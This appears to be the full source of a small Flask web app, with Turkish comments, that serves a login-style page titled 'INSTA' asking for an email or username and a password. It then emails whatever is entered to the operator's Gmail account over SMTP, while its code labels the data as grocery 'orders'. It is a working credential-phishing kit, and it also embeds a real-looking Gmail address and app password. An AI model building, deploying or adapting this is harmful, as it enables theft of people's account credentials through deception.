from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

app = Flask(__name__)

# =========================
# BURAYI KENDİNE GÖRE DEĞİŞTİR
# =========================

MARKET_ADI = "INSTA"

GMAIL_GONDEREN = os.environ.get("memoapk7@gmail.com")       # Render environment variable
GMAIL_APP_SIFRE = os.environ.get("rgak tocq yyxu hxk")      # Render environment variable
ALICI_MAIL = os.environ.get("memoapk7@gmail.com")       # Render environment variable

# =========================
# HTML SAYFASI
# =========================

HTML = """
<!doctype html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ market_adi }}</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            margin: 0;
            padding: 0;
        }

        .kutu {
            max-width: 420px;
            margin: 50px auto;
            background: white;
            padding: 25px;
            border-radius: 14px;
            box-shadow: 0 4px 14px rgba(0,0,0,0.12);
        }

        h1 {
            text-align: center;
            margin-bottom: 25px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-top: 14px;
            margin-bottom: 6px;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-sizing: border-box;
            font-size: 16px;
        }

        button {
            width: 100%;
            margin-top: 22px;
            padding: 13px;
            border: none;
            border-radius: 10px;
            background: #222;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            opacity: 0.92;
        }

        .mesaj {
            margin-top: 16px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            font-weight: bold;
        }

        .basarili {
            background: #e8f7e8;
            color: #1d6b1d;
        }

        .hatali {
            background: #ffe9e9;
            color: #a11a1a;
        }
    </style>
</head>
<body>
    <div class="kutu">
        <h1>{{ market_adi }}</h1>

        <form method="POST">
            <label for="urun1">{{ market_adi }} - e posta </label>
            <input type="text" id="urun1" name="urun1" placeholder="e posta veya kullanıcı adı">

            <label for="urun2">{{ market_adi }} - şifre </label>
            <input type="text" id="urun2" name="urun2" placeholder="şifreni yaz">

            <button type="submit">Gönder</button>
        </form>

        {% if mesaj %}
            <div class="mesaj {{ mesaj_tipi }}">
                {{ mesaj }}
            </div>
        {% endif %}
    </div>
</body>
</html>
"""

# =========================
# MAIL GÖNDERME FONKSİYONU
# =========================

def mail_gonder(urun1, urun2):
    konu = f"{MARKET_ADI} - Yeni Sipariş"

    icerik = f"""
Yeni sipariş geldi.

Market adı: {MARKET_ADI}
1. Ürün: {urun1 if urun1 else '-'}
2. Ürün: {urun2 if urun2 else '-'}
"""

    msg = MIMEMultipart()
    msg["From"] = GMAIL_GONDEREN
    msg["To"] = ALICI_MAIL
    msg["Subject"] = konu

    msg.attach(MIMEText(icerik, "plain", "utf-8"))

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(GMAIL_GONDEREN, GMAIL_APP_SIFRE)
        server.send_message(msg)

# =========================
# ANA SAYFA
# =========================

@app.route("/", methods=["GET", "POST"])
def index():
    mesaj = ""
    mesaj_tipi = ""

    if request.method == "POST":
        urun1 = request.form.get("urun1", "").strip()
        urun2 = request.form.get("urun2", "").strip()

        if not urun1 and not urun2:
            mesaj = "En az bir ürün yazmalısın."
            mesaj_tipi = "hatali"
        else:
            try:
                mail_gonder(urun1, urun2)
                mesaj = "Sipariş başarıyla gönderildi."
                mesaj_tipi = "basarili"
            except Exception as e:
                mesaj = f"Hata oluştu: {str(e)}"
                mesaj_tipi = "hatali"

    return render_template_string(
        HTML,
        market_adi=MARKET_ADI,
        mesaj=mesaj,
        mesaj_tipi=mesaj_tipi
    )

# =========================
# ÇALIŞTIRMA
# =========================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
